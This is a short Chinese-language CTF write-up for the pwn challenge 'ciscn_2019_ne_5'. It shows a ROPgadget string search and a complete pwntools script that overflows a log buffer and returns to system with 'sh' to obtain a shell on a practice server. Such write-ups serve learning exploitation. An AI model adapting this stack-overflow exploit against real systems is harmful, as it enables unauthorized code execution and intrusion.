---
title: Jan 14 Writeup
mathjax: true
date: 2021-01-14 15:15:17
tags: pwn
---

## ciscn_2019_ne_5

傻了傻了，居然没想到用ROPgadget来找字符串，而只是在IDA Pro中看了而已。

system函数已经在Print函数中给出来了。只要有一个`/bin/sh`就够了。

但是这样也不准确，只需要`sh`就可以了。

以后找字符串的时候，直接用ROPgadget，不只能找gadget好吧。。。
```
➜  ciscn_2019_ne_5 ROPgadget --binary pwn --string 'sh'
Strings information
============================================================
0x080482ea : sh
```

```python
from pwn import *

p = remote('node3.buuoj.cn', 27077)
elf = ELF('./pwn')
system_plt = elf.plt['system']

payload = b'a' * 0x48 + b'b' * 0x4 + p32(system_plt) + p32(0xdeadbeef) + p32(0x080482ea)
p.sendlineafter('Please input admin password:', 'administrator')
p.sendlineafter('0.Exit\n:', '1')
p.sendlineafter('Please input new log info:', payload)
p.sendlineafter('0.Exit\n:', '4')

p.interactive()
```

